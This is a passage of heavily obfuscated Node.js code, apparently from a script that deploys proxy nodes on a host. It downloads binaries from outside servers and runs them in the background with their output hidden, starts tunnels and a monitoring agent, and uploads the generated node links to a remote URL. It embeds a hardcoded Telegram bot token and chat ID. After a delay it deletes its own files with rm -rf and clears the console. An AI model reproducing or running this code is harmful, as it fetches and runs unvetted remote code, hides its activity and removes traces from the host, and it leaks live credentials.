        console[_0x404880(_0x315d15._0x333b74)]('php\x20running\x20error:\x20' + _0x288c6d)
      }
    } else {
      let _0x353984 = ''
      const _0x1741fc = [
        _0x404880(_0x315d15._0x5e02c4),
        _0x404880(_0x315d15._0x1afefa),
        _0x404880(0xf1),
        _0x404880(_0x315d15._0x1485da),
        _0x404880(_0x315d15._0x3c6c42),
        _0x404880(_0x315d15._0x55220b)
      ]
      _0x1741fc[_0x404880(0x160)](NEZHA_PORT) && (_0x353984 = '--tls')
      const _0x260c56 =
        _0x404880(_0x315d15._0xbbaf53) +
        npmPath +
        _0x404880(_0x315d15._0x5298c3) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        '\x20-p\x20' +
        NEZHA_KEY +
        '\x20' +
        _0x353984 +
        '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'
      try {
        ;(await exec(_0x260c56),
          console[_0x404880(0x188)](npmName + _0x404880(_0x315d15._0x1728ad)),
          await new Promise((_0x4fe88b) => setTimeout(_0x4fe88b, 0x3e8)))
      } catch (_0x4d37b1) {
        console['error'](_0x404880(0x149) + _0x4d37b1)
      }
    }
  } else console[_0x404880(0x188)](_0x404880(0x1a3))
  const _0x1a530f = 'nohup\x20' + webPath + _0x404880(_0x315d15._0x4d70a8) + FILE_PATH + '/config.json\x20>/dev/null\x202>&1\x20&'
  try {
    ;(await exec(_0x1a530f),
      console[_0x404880(_0x315d15._0x5336d5)](webName + _0x404880(0xd8)),
      await new Promise((_0x2c7c02) => setTimeout(_0x2c7c02, 0x3e8)))
  } catch (_0x227db4) {
    console['error'](_0x404880(_0x315d15._0x5af03b) + _0x227db4)
  }
  if (fs[_0x404880(_0x315d15._0x1d19f5)](botPath)) {
    let _0x4bfc12
    if (ARGO_AUTH[_0x404880(_0x315d15._0x5e1f84)](/^[A-Z0-9a-z=]{120,250}$/))
      _0x4bfc12 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
    else
      ARGO_AUTH[_0x404880(0xba)](/TunnelSecret/)
        ? (_0x4bfc12 =
            _0x404880(_0x315d15._0x356e94) + path[_0x404880(0x1d8)](FILE_PATH, _0x404880(_0x315d15._0x1f8a66)) + _0x404880(_0x315d15._0x3f9501))
        : (_0x4bfc12 =
            'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22' +
            path[_0x404880(0x1d8)](bootLogPath) +
            _0x404880(0xd1) +
            ARGO_PORT)
    try {
      ;(await exec(
        _0x404880(_0x315d15._0x8f8d80) + path[_0x404880(_0x315d15._0x2e09a3)](botPath) + '\x22\x20' + _0x4bfc12 + _0x404880(_0x315d15._0x4e81a2)
      ),
        console[_0x404880(0x188)](botName + _0x404880(0xd8)),
        await new Promise((_0x1c5765) => setTimeout(_0x1c5765, 0x7d0)))
    } catch (_0x29e24d) {
      console[_0x404880(0x15c)]('Error\x20executing\x20command:\x20' + _0x29e24d)
    }
  }
  await new Promise((_0x3b8a30) => setTimeout(_0x3b8a30, 0x1388))
}
function getFilesForArchitecture(_0x40cbdd) {
  const _0x176a63 = { _0x4d385c: 0x1af, _0x2d4974: 0x154, _0x262a60: 0x154, _0x532ccd: 0xc9 },
    _0x5dc748 = _0xfeddc6,
    _0x566ca4 = _0x40cbdd === _0x5dc748(0x1cf) ? 'https://arm64.oooen.com' : _0x5dc748(0x1d9),
    _0x228ab0 = _0x40cbdd === 'arm' ? _0x5dc748(_0x176a63._0x4d385c) : 'https://amd64.ssss.nyc.mn',
    _0x4d4cdc = [
      { fileName: webPath, fileUrls: [_0x566ca4 + _0x5dc748(0x153), _0x228ab0 + '/web'] },
      { fileName: botPath, fileUrls: [_0x566ca4 + _0x5dc748(_0x176a63._0x2d4974), _0x228ab0 + _0x5dc748(_0x176a63._0x262a60)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x4d4cdc[_0x5dc748(_0x176a63._0x532ccd)]({ fileName: npmPath, fileUrls: [_0x566ca4 + _0x5dc748(0x1b0), _0x228ab0 + '/agent'] })
        : _0x4d4cdc[_0x5dc748(_0x176a63._0x532ccd)]({ fileName: phpPath, fileUrls: [_0x566ca4 + _0x5dc748(0x1cc), _0x228ab0 + '/v1'] })),
    _0x4d4cdc
  )
}
function argoType() {
  const _0x85d936 = { _0x54f1df: 0x160, _0x56d415: 0x12b, _0x4d4caa: 0x1ae, _0x53b14d: 0x143, _0x448cdb: 0x17e },
    _0x438f22 = _0xfeddc6
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x438f22(0x188)](_0x438f22(0xe9))
    return
  }
  if (ARGO_AUTH[_0x438f22(_0x85d936._0x54f1df)](_0x438f22(0x1ad))) {
    fs[_0x438f22(_0x85d936._0x56d415)](path[_0x438f22(0x1ce)](FILE_PATH, 'tunnel.json'), ARGO_AUTH)
    const _0x254f2b =
      _0x438f22(_0x85d936._0x4d4caa) +
      ARGO_AUTH[_0x438f22(0xc3)]('\x22')[0xb] +
      _0x438f22(0x138) +
      path[_0x438f22(0x1ce)](FILE_PATH, _0x438f22(0xc8)) +
      _0x438f22(0x145) +
      ARGO_DOMAIN +
      _0x438f22(_0x85d936._0x53b14d) +
      ARGO_PORT +
      _0x438f22(_0x85d936._0x448cdb)
    fs[_0x438f22(0x12b)](path[_0x438f22(0x1ce)](FILE_PATH, _0x438f22(0xef)), _0x254f2b)
  } else console['log'](_0x438f22(0xf4) + ARGO_PORT + _0x438f22(0x1dd))
}
async function waitForQuickTunnelLog(_0x43cc72 = 0x7530) {
  const _0x44f9fa = _0xfeddc6,
    _0x42ca36 = Date['now']() + _0x43cc72
  while (Date[_0x44f9fa(0x16a)]() < _0x42ca36) {
    try {
      if (fs[_0x44f9fa(0x101)](bootLogPath)) {
        const _0x90b0c8 = fs[_0x44f9fa(0x166)](bootLogPath, 'utf-8')
        if (/trycloudflare\.com/[_0x44f9fa(0x16d)](_0x90b0c8)) return _0x90b0c8
      }
    } catch (_0x13198f) {}
    await new Promise((_0x39035a) => setTimeout(_0x39035a, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x3f8d95 = { _0x24f73c: 0xc3, _0x1e6d1e: 0xeb, _0x2a00c7: 0x188, _0x3c5325: 0x1aa, _0x485903: 0xd1, _0x5e4efa: 0xc6 },
    _0x460d1d = { _0x428241: 0x110, _0x47f4de: 0x1b1, _0x3fadbc: 0x122, _0x2fc3bd: 0x14a },
    _0x51ac27 = _0xfeddc6
  let _0x422f3b
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x422f3b = ARGO_DOMAIN), console[_0x51ac27(0x188)]('ARGO_DOMAIN:', _0x422f3b), await generateLinks(_0x422f3b))
  else
    try {
      const _0x344d0e = await waitForQuickTunnelLog(),
        _0x291f70 = _0x344d0e[_0x51ac27(_0x3f8d95._0x24f73c)]('\x0a'),
        _0xbf3d44 = []
      _0x291f70[_0x51ac27(_0x3f8d95._0x1e6d1e)]((_0x5c73ee) => {
        const _0x4f1264 = _0x51ac27,
          _0x12fbc = _0x5c73ee[_0x4f1264(0xba)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x12fbc) {
          const _0x292d58 = _0x12fbc[0x1]
          _0xbf3d44[_0x4f1264(0x16c)](_0x292d58)
        }
      })
      if (_0xbf3d44['length'] > 0x0)
        ((_0x422f3b = _0xbf3d44[0x0]), console[_0x51ac27(_0x3f8d95._0x2a00c7)](_0x51ac27(0x18a), _0x422f3b), await generateLinks(_0x422f3b))
      else {
        ;(console[_0x51ac27(_0x3f8d95._0x2a00c7)](_0x51ac27(0x114)), fs[_0x51ac27(_0x3f8d95._0x3c5325)](path['join'](FILE_PATH, _0x51ac27(0x11d))))
        async function _0x4c5646() {
          const _0x4945f7 = _0x51ac27
          try {
            process['platform'] === 'win32'
              ? await exec(_0x4945f7(0x156) + botName + _0x4945f7(_0x460d1d._0x428241))
              : await exec(
                  'pkill\x20-f\x20\x22[' +
                    botName[_0x4945f7(_0x460d1d._0x47f4de)](0x0) +
                    ']' +
                    botName[_0x4945f7(_0x460d1d._0x3fadbc)](0x1) +
                    _0x4945f7(_0x460d1d._0x2fc3bd)
                )
          } catch (_0x2bdf95) {}
        }
        ;(_0x4c5646(), await new Promise((_0x56d4e2) => setTimeout(_0x56d4e2, 0xbb8)))
        const _0x9a79ee =
          'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22' +
          path[_0x51ac27(0x1d8)](bootLogPath) +
          _0x51ac27(_0x3f8d95._0x485903) +
          ARGO_PORT
        try {
          ;(await exec(_0x51ac27(0x1c4) + path['resolve'](botPath) + '\x22\x20' + _0x9a79ee + _0x51ac27(0xbe)),
            console[_0x51ac27(_0x3f8d95._0x2a00c7)](botName + '\x20is\x20running'),
            await new Promise((_0x295dbd) => setTimeout(_0x295dbd, 0x1770)),
            await extractDomains())
        } catch (_0x4c3796) {
          console[_0x51ac27(0x15c)](_0x51ac27(0x186) + _0x4c3796)
        }
      }
    } catch (_0x2ef5f6) {
      console['error'](_0x51ac27(_0x3f8d95._0x5e4efa), _0x2ef5f6)
    }
}
async function getMetaInfo() {
  const _0x5a9864 = {
      _0xc226cc: 0x136,
      _0x4c51aa: 0xfc,
      _0x258d49: 0xfc,
      _0x579546: 0x131,
      _0x41d325: 0x105,
      _0x129304: 0x1a5,
      _0x2b36c1: 0x136,
      _0x1c17a8: 0x1c2,
      _0x1956d0: 0x131,
      _0x4a48ad: 0xe8,
      _0x4976ae: 0xee
    },
    _0x401cc0 = _0xfeddc6
  try {
    const _0x32acee = await axios['get'](_0x401cc0(0x19e), { headers: { 'User-Agent': _0x401cc0(_0x5a9864._0xc226cc), timeout: 0xbb8 } })
    if (_0x32acee['data'] && _0x32acee[_0x401cc0(0x131)][_0x401cc0(_0x5a9864._0x4c51aa)] && _0x32acee['data'][_0x401cc0(0x123)])
      return (_0x32acee[_0x401cc0(0x131)][_0x401cc0(_0x5a9864._0x258d49)] + '-' + _0x32acee[_0x401cc0(_0x5a9864._0x579546)]['isp'])['replace'](
        /\s+/g,
        '_'
      )
  } catch (_0x5c91bc) {
    try {
      const _0x1ce13c = await axios[_0x401cc0(_0x5a9864._0x41d325)](_0x401cc0(_0x5a9864._0x129304), {
        headers: { 'User-Agent': _0x401cc0(_0x5a9864._0x2b36c1), timeout: 0xbb8 }
      })
      if (
        _0x1ce13c[_0x401cc0(_0x5a9864._0x579546)] &&
        _0x1ce13c[_0x401cc0(0x131)][_0x401cc0(_0x5a9864._0x1c17a8)] === _0x401cc0(0x1cb) &&
        _0x1ce13c[_0x401cc0(0x131)]['countryCode'] &&
        _0x1ce13c[_0x401cc0(_0x5a9864._0x579546)]['org']
      )
        return (_0x1ce13c['data']['countryCode'] + '-' + _0x1ce13c[_0x401cc0(_0x5a9864._0x1956d0)]['org'])[_0x401cc0(_0x5a9864._0x4a48ad)](
          /\s+/g,
          '_'
        )
    } catch (_0x8604a2) {}
  }
  return _0x401cc0(_0x5a9864._0x4976ae)
}
async function getServerIP() {
  const _0x1d22d9 = { _0x50e229: 0x131, _0x4fca9c: 0xcb, _0x33eb0a: 0x13e, _0x48bf34: 0x12d, _0xca6f8d: 0x15d },
    _0x1c365a = _0xfeddc6
  let _0x49ad43 = ''
  try {
    const _0x4ab553 = await axios['get']('http://ipv4.ip.sb', { timeout: 0xbb8 })
    _0x49ad43 = _0x4ab553[_0x1c365a(_0x1d22d9._0x50e229)][_0x1c365a(0x13e)]()
  } catch (_0x25ba91) {
    try {
      _0x49ad43 = execSync(_0x1c365a(_0x1d22d9._0x4fca9c))['toString']()[_0x1c365a(_0x1d22d9._0x33eb0a)]()
    } catch (_0x389318) {
      try {
        const _0x45ccbb = await axios[_0x1c365a(0x105)](_0x1c365a(_0x1d22d9._0x48bf34), { timeout: 0xbb8 })
        _0x49ad43 = '[' + _0x45ccbb[_0x1c365a(0x131)][_0x1c365a(0x13e)]() + ']'
      } catch (_0x3f413b) {
        try {
          _0x49ad43 = '[' + execSync(_0x1c365a(0xcd))['toString']()[_0x1c365a(_0x1d22d9._0x33eb0a)]() + ']'
        } catch (_0x334d37) {
          console['error'](_0x1c365a(_0x1d22d9._0xca6f8d), _0x334d37[_0x1c365a(0x161)])
        }
      }
    }
  }
  return _0x49ad43
}
async function generateLinks(_0x5dfb82) {
  const _0x37d09b = {
      _0x1c8b2b: 0x19a,
      _0x2c7ab1: 0x189,
      _0x143fa5: 0xf5,
      _0x394791: 0x159,
      _0x3f4bc8: 0x19b,
      _0x1d5b8c: 0x140,
      _0x1e82ba: 0xf8,
      _0x20922b: 0xc2,
      _0x3d3ff1: 0x190,
      _0x3ceaa4: 0x122,
      _0x2ed3b0: 0x107,
      _0x53ac76: 0x19b,
      _0x3bcb81: 0x12b,
      _0x43c92b: 0x190,
      _0x2f1418: 0x159
    },
    _0xec29e1 = await getMetaInfo(),
    _0x5c3b85 = NAME ? NAME + '-' + _0xec29e1 : _0xec29e1,
    _0x51b101 = await getServerIP()
  return new Promise((_0x47fb12) => {
    setTimeout(() => {
      const _0x59ca81 = _0x1084,
        _0x326e0b = {
          v: '2',
          ps: '' + _0x5c3b85,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x59ca81(_0x37d09b._0x1c8b2b),
          net: 'ws',
          type: _0x59ca81(_0x37d09b._0x2c7ab1),
          host: _0x5dfb82,
          path: _0x59ca81(0x12e),
          tls: 'tls',
          sni: _0x5dfb82,
          alpn: '',
          fp: _0x59ca81(0x119)
        }
      let _0x48ea23 =
        _0x59ca81(0x175) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x59ca81(_0x37d09b._0x143fa5) +
        _0x5dfb82 +
        _0x59ca81(0x140) +
        _0x5dfb82 +
        _0x59ca81(0xe0) +
        _0x5c3b85 +
        _0x59ca81(0x102) +
        Buffer['from'](JSON['stringify'](_0x326e0b))[_0x59ca81(_0x37d09b._0x394791)](_0x59ca81(_0x37d09b._0x3f4bc8)) +
        _0x59ca81(0x18f) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?security=tls&sni=' +
        _0x5dfb82 +
        _0x59ca81(_0x37d09b._0x1d5b8c) +
        _0x5dfb82 +
        '&path=%2Ftrojan-argo%3Fed%3D2560#' +
        _0x5c3b85 +
        _0x59ca81(_0x37d09b._0x1e82ba)
      if (isValidPort(HY2_PORT)) {
        const _0x1101c6 = getCertificateFingerprint(certPath),
          _0x420cd7 = _0x1101c6 ? _0x59ca81(0x179) + encodeURIComponent(_0x1101c6) : '',
          _0x31e6a0 = _0x59ca81(_0x37d09b._0x20922b) + UUID + '@' + _0x51b101 + ':' + HY2_PORT + _0x59ca81(0xc7) + _0x420cd7 + '#' + _0x5c3b85
        _0x48ea23 += _0x31e6a0
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x392265 = _0x59ca81(0x175) + UUID + '@' + _0x51b101 + ':' + REALITY_PORT + _0x59ca81(0xd7) + publicKey + _0x59ca81(0x162) + _0x5c3b85
        _0x48ea23 += _0x392265
      }
      if (isValidPort(S5_PORT)) {
        const _0xa292d1 = Buffer[_0x59ca81(_0x37d09b._0x3d3ff1)](
            UUID[_0x59ca81(_0x37d09b._0x3ceaa4)](0x0, 0x8) + ':' + UUID[_0x59ca81(_0x37d09b._0x2ed3b0)](-0xc)
          )[_0x59ca81(0x159)](_0x59ca81(_0x37d09b._0x53ac76)),
          _0x529139 = _0x59ca81(0xb8) + _0xa292d1 + '@' + _0x51b101 + ':' + S5_PORT + '#' + _0x5c3b85
        _0x48ea23 += _0x529139
      }
      ;(console[_0x59ca81(0x188)](Buffer[_0x59ca81(_0x37d09b._0x3d3ff1)](_0x48ea23)[_0x59ca81(_0x37d09b._0x394791)]('base64')),
        fs[_0x59ca81(_0x37d09b._0x3bcb81)](subPath, Buffer[_0x59ca81(_0x37d09b._0x43c92b)](_0x48ea23)[_0x59ca81(0x159)](_0x59ca81(0x19b))),
        fs[_0x59ca81(_0x37d09b._0x3bcb81)](listPath, _0x48ea23, _0x59ca81(0xbc)),
        console[_0x59ca81(0x188)](FILE_PATH + _0x59ca81(0xca)),
        (subContent = Buffer['from'](_0x48ea23)[_0x59ca81(_0x37d09b._0x2f1418)](_0x59ca81(0x19b))),
        uploadNodes(),
        _0x47fb12(_0x48ea23))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x1b3b81 = { _0x15a89c: 0x1d2, _0x1d02af: 0x11e, _0x3c31a8: 0x188, _0x1b55b8: 0x1d5, _0x57dfa9: 0x11e, _0x3ea66a: 0x1c2, _0x2839d1: 0x188 },
    _0xadcf6 = _0xfeddc6
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x2e7980 = PROJECT_URL + '/' + SUB_PATH,
      _0x1d7a12 = { subscription: [_0x2e7980] }
    try {
      const _0x36c1a5 = await axios[_0xadcf6(_0x1b3b81._0x15a89c)](UPLOAD_URL + '/api/add-subscriptions', _0x1d7a12, {
        headers: { 'Content-Type': _0xadcf6(_0x1b3b81._0x1d02af) }
      })
      return _0x36c1a5 && _0x36c1a5[_0xadcf6(0x1c2)] === 0xc8
        ? (console[_0xadcf6(_0x1b3b81._0x3c31a8)](_0xadcf6(_0x1b3b81._0x1b55b8)), _0x36c1a5)
        : null
    } catch (_0x34e9cd) {
      if (_0x34e9cd[_0xadcf6(0xfd)]) {
        if (_0x34e9cd['response']['status'] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0xadcf6(0x101)](listPath)) return
      const _0x2b1b6a = fs[_0xadcf6(0x166)](listPath, _0xadcf6(0x12a)),
        _0x4bf855 = _0x2b1b6a[_0xadcf6(0xc3)]('\x0a')[_0xadcf6(0x10f)]((_0x54b750) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//[_0xadcf6(0x16d)](_0x54b750)
        )
      if (_0x4bf855['length'] === 0x0) return
      const _0x123975 = JSON['stringify']({ nodes: _0x4bf855 })
      try {
        const _0x1b7416 = await axios[_0xadcf6(0x1d2)](UPLOAD_URL + '/api/add-nodes', _0x123975, {
          headers: { 'Content-Type': _0xadcf6(_0x1b3b81._0x57dfa9) }
        })
        return _0x1b7416 && _0x1b7416[_0xadcf6(_0x1b3b81._0x3ea66a)] === 0xc8
          ? (console[_0xadcf6(_0x1b3b81._0x2839d1)](_0xadcf6(0x17a)), _0x1b7416)
          : null
      } catch (_0x94ed67) {
        return null
      }
    } else return
  }
}
function _0x543c() {
  const _0x410692 = [
    'readFile',
    '800',
    'PORT',
    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
    '\x20is\x20running',
    'password',
    'mkdirSync',
    'deployzy.933993.xyz',
    'web\x20running\x20error:\x20',
    'publicKey',
    '420510vCbHJm',
    'fileUrls',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'digest',
    'update',
    'floor',
    '8443',
    '\x22\x20run',
    '127.0.0.1',
    'pipe',
    'replace',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    'forEach',
    'vless-fallback-in',
    'App\x20is\x20running',
    'Unknown',
    'tunnel.yml',
    'renameSync',
    '2096',
    'automatic\x20access\x20task\x20added\x20successfully',
    '16pioIxW',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    '?encryption=none&security=tls&sni=',
    'CHAT_ID',
    '\x20>\x20nul\x202>&1',
    '\x0a\x20\x20\x20\x20',
    'Telegram\x20message\x20sent\x20successfully',
    'Empowerment\x20failed\x20for\x20',
    'toUpperCase',
    'country_code',
    'response',
    'NEZHA_SERVER',
    'pkcs8',
    'Download\x20',
    'existsSync',
    '\x0a\x0avmess://',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    'quic',
    'get',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    'slice',
    '\x22\x20-out\x20\x22',
    'unlink',
    '17352zYdjAc',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'Retrying\x20',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    'ARGO_AUTH',
    'filter',
    '.exe\x20>\x20nul\x202>&1',
    'nohup\x20',
    'abcdefghijklmnopqrstuvwxyz',
    '\x20successfully',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'spki',
    'true',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'firefox',
    '\x20>/dev/null\x202>&1',
    'toLowerCase',
    'promises',
    'boot.log',
    'application/json',
    'amd',
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a',
    'https://oooo.serv00.net/add-url',
    'substring',
    'isp',
    'isFile',
    'readdirSync',
    'win32',
    'Empowerment\x20success\x20for\x20',
    'MarkdownV2',
    'crypto',
    'utf-8',
    'writeFileSync',
    'child_process',
    'http://ipv6.ip.sb',
    '/vmess-argo?ed=2560',
    'Error\x20in\x20startserver:',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    'data',
    'SHOW_LOG',
    'createWriteStream',
    '\x5c$&',
    'privateKey',
    'Mozilla/5.0',
    'end',
    '\x0a\x20\x20credentials-file:\x20',
    '8962228750:AAGlYPI5a4FVgx0-gUbB383JirHhkuqbwRE',
    'map',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    '898173vsQTEZ',
    'trojan',
    'trim',
    'https://api.telegram.org/bot',
    '&fp=firefox&type=ws&host=',
    'dirname',
    'vless-in',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'arm64',
    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    'vless',
    'config.json',
    'subarray',
    'npm\x20running\x20error:\x20',
    '\x22\x20>\x20/dev/null\x202>&1',
    'del\x20/f\x20/q\x20',
    'ARGO_PORT',
    '/dev/null',
    'BOT_TOKEN',
    '180233cd-22c9-4144-a559-012e45986dd6',
    'basename',
    '节点推送**\x0a```',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    '/web',
    '/bot',
    'text/plain;\x20charset=utf-8',
    'taskkill\x20/f\x20/im\x20',
    'https://bing.com',
    'NAME',
    'toString',
    'ARGO_DOMAIN',
    'REALITY_PORT',
    'error',
    'Failed\x20to\x20get\x20IP\x20address:',
    '/trojan-argo',
    'NEZHA_KEY',
    'includes',
    'message',
    '&type=tcp&headerType=none#',
    'inbounds',
    '54SboJGs',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'readFileSync',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    'length',
    'rm\x20-rf\x20',
    'now',
    'tls',
    'push',
    'test',
    '\x20-c\x20\x22',
    'UPLOAD_URL',
    'openssl\x20version',
    'finish',
    'all',
    'CFIP',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    '\x0avless://',
    '9ykBZHm',
    'util',
    'UUID',
    '&pinSHA256=',
    'Nodes\x20uploaded\x20successfully',
    '7575949494',
    '151836siAZSC',
    'false',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    '\x20failed:\x20',
    '2059560IyohLF',
    'write',
    'CFPORT',
    '\x20-c\x20',
    '\x20from\x20backup\x20source',
    'AUTO_ACCESS',
    'Error\x20executing\x20command:\x20',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'log',
    'none',
    'ArgoDomain:',
    '2083',
    'catch',
    'reality',
    'BggqhkjOPQMBBw==\x0a',
    '\x0a\x0atrojan://',
    'from',
    '/api/delete-nodes',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    '2087',
    'www.iij.ad.jp:443',
    'has',
    'socks',
    'der',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'auto',
    'base64',
    'SUB_PATH',
    'xtls-rprx-vision',
    'https://api.ip.sb/geoip',
    'https+local://8.8.8.8/dns-query',
    'arch',
    'fileName',
    'path',
    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
    '\x20-s\x20',
    'http://ip-api.com/json',
    '443',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    '\x0aPublicKey:\x20',
    '187wTEpho',
    'unlinkSync',
    '/sendMessage',
    'vmess',
    'TunnelSecret',
    '\x0a\x20\x20tunnel:\x20',
    'https://arm64.ssss.nyc.mn',
    '/agent',
    'charAt',
    'ignore',
    '/vless-argo',
    'sha256',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    '2053',
    'FILE_PATH',
    'mfa.gov.ua',
    'hex',
    'env',
    'PROJECT_URL',
    'HY2_PORT',
    'platform',
    'hysteria',
    'www.iij.ad.jp',
    'random',
    'status',
    'http',
    'nohup\x20\x22',
    'index.html',
    'stdout',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    'createServer',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'Public\x20Key:',
    'success',
    '/v1',
    'freedom',
    'join',
    'arm',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    'axios',
    'post',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    'Subscription\x20uploaded\x20successfully',
    'string',
    'writeHead',
    'resolve',
    'https://amd64.oooen.com',
    '165953BybqtK',
    'http\x20server\x20is\x20running\x20on\x20',
    'vless-tcp-in',
    '\x20in\x20clouudflare',
    'direct',
    '.npm',
    'statSync',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'PrivateKey:\x20',
    '/vmess-argo',
    'text/html;\x20charset=utf-8',
    '\x0asocks://',
    '-----END\x20CERTIFICATE-----\x0a',
    'match',
    'x25519',
    'utf8',
    '14084zjlgGR',
    '\x20>/dev/null\x202>&1\x20&',
    'stringify',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    'vless-ws-in',
    '\x0ahysteria2://',
    'split',
    '2KfSNaL',
    'config.yaml',
    'Error\x20reading\x20boot.log:',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    'tunnel.json',
    'unshift',
    '/sub.txt\x20saved\x20successfully',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    'pop',
    'curl\x20-sm\x203\x20ipv6.ip.sb',
    'base64url',
    'proxy',
    'Private\x20Key:',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'export'
  ]
  _0x543c = function () {
    return _0x410692
  }
  return _0x543c()
}
function cleanFiles() {
  const _0x4b7cb0 = { _0x2c909e: 0x1ce, _0x5d5af6: 0xf7, _0x167c5c: 0x169 },
    _0x37a3fd = { _0x2a45ba: 0x188 }
  setTimeout(() => {
    const _0x105a48 = _0x1084,
      _0x1054db = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x1054db['push'](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x1054db[_0x105a48(0x16c)](phpPath)
    process[_0x105a48(0x1be)] === _0x105a48(0x126)
      ? exec(_0x105a48(0x14b) + _0x1054db[_0x105a48(_0x4b7cb0._0x2c909e)]('\x20') + _0x105a48(_0x4b7cb0._0x5d5af6), (_0x1aae5d) => {
          const _0x404913 = _0x105a48
          ;(console['clear'](), alwaysLog(_0x404913(0xed)), console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'))
        })
      : exec(_0x105a48(_0x4b7cb0._0x167c5c) + _0x1054db[_0x105a48(0x1ce)]('\x20') + _0x105a48(0x11a), (_0x1c3de0) => {
          const _0x177b6c = _0x105a48
          ;(console['clear'](), alwaysLog(_0x177b6c(0xed)), console[_0x177b6c(_0x37a3fd._0x2a45ba)](_0x177b6c(0x192)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x14d49c = { _0x15ae6: 0x188, _0x532d7d: 0x1b6, _0x207c67: 0x13f, _0x4cbde7: 0xf9, _0x40c105: 0x174 },
    _0x51013a = _0xfeddc6
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x51013a(_0x14d49c._0x15ae6)](_0x51013a(_0x14d49c._0x532d7d))
